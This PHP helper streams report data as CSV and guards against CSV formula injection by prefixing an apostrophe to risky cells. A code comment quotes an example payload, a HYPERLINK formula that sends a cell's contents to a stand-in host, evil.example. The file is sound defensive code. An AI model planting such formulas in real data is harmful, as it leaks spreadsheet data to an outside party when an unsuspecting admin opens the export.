<?php
/**
 * Shared CSV export helper for Reports / Activity Log.
 *
 * We export CSV rather than a "real" PDF/Excel binary — CSV opens directly
 * in Excel/Google Sheets (which is what "export to Excel" means for almost
 * every end user) without adding a PDF/XLSX library dependency that a plain
 * XAMPP install won't have by default. If a true PDF export is needed later,
 * the print-friendly view (see reports/index.php's "Print / Save as PDF"
 * link) is the lightest-weight path: the browser's own print-to-PDF avoids
 * pulling in a rendering library entirely.
 *
 * Streams the CSV and exits — call this last, after all validation.
 */

/**
 * BUGFIX (CSV/Formula Injection, CWE-1236): names, company names, and
 * other free-text fields a registrant controls flow straight into these
 * exports (see reports/export/index.php's 'accounts' case). Excel/Sheets
 * treats any cell starting with =, +, -, or @ as a formula, so a
 * registrant could set their Company to something like
 * =HYPERLINK("http://evil.example/?"&A1,"Click") and have it execute the
 * moment an admin opens the exported file. Prefixing a lone apostrophe
 * forces spreadsheet apps to render the cell as plain text instead — the
 * standard mitigation for this class of bug — without changing what's
 * displayed to a human reading the CSV.
 */
function csv_safe_cell($value): string {
    $value = (string) $value;
    if ($value !== '' && strpbrk($value[0], "=+-@\t\r") !== false) {
        return "'" . $value;
    }
    return $value;
}

function export_csv(string $filename, array $headers, array $rows): void {
    header('Content-Type: text/csv; charset=utf-8');
    header('Content-Disposition: attachment; filename="' . $filename . '"');

    $out = fopen('php://output', 'w');
    // UTF-8 BOM so Excel on Windows doesn't mangle non-ASCII characters
    // (peso signs, accented names) when double-clicking the file open.
    fwrite($out, "\xEF\xBB\xBF");
    fputcsv($out, array_map('csv_safe_cell', $headers));
    foreach ($rows as $row) {
        fputcsv($out, array_map('csv_safe_cell', $row));
    }
    fclose($out);
    exit;
}
